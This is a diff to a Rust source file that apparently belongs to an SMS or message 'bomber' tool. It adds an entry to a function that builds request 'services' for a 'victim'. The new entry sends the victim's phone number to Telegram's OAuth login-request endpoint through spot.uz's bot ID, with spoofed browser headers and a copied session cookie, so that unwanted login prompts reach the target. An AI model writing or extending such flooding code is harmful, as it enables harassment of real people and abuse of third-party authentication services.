@@ -269,6 +269,75 @@ pub async fn construct_services_list(victim: Victim) -> Vec<Service> {
 
                 services.push(service);
             }
+
+            // Telegram
+            // spot.uz
+            {
+                let mut service = Service {
+                    name: "spot.uz".to_string(),
+                    service_type: ServiceType::ServiceMessage,
+                    method: Method::POST,
+                    url: "https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F".to_string(),
+                    headers: HeaderMap::new(),
+                    body_type: BodyType::Form,
+                    body: Default::default(),
+                };
+
+                service
+                    .headers
+                    .insert("Host", r#"oauth.telegram.org"#.parse().unwrap());
+                service.headers.insert("User-Agent", r#"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0"#.parse().unwrap());
+                service.headers.insert("Accept", r#"*/*"#.parse().unwrap());
+                service.headers.insert(
+                    "Accept-Language",
+                    r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Accept-Encoding",
+                    r#"gzip, deflate, br, zstd"#.parse().unwrap(),
+                );
+                service
+                    .headers
+                    .insert("X-Requested-With", r#"XMLHttpRequest"#.parse().unwrap());
+                service.headers.insert(
+                    "Content-type",
+                    r#"application/x-www-form-urlencoded"#.parse().unwrap(),
+                );
+                service
+                    .headers
+                    .insert("Origin", r#"https://oauth.telegram.org"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
+                service.headers.insert("Referer", r#"https://oauth.telegram.org/auth?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F"#.parse().unwrap());
+                service.headers.insert(
+                    "Cookie",
+                    r#"stel_ssid=1717299473e29f94b9_1567173815156981284"#
+                        .parse()
+                        .unwrap(),
+                );
+                service
+                    .headers
+                    .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Site", r#"same-origin"#.parse().unwrap());
+                service.headers.insert("DNT", r#"1"#.parse().unwrap());
+                service.headers.insert("Sec-GPC", r#"1"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("host", r#"oauth.telegram.org"#.parse().unwrap());
+
+                let phone = victim.phone.clone();
+                service.body = json!({
+                    "phone": phone.phone
+                });
+
+                services.push(service);
+            }
         }
     }
 
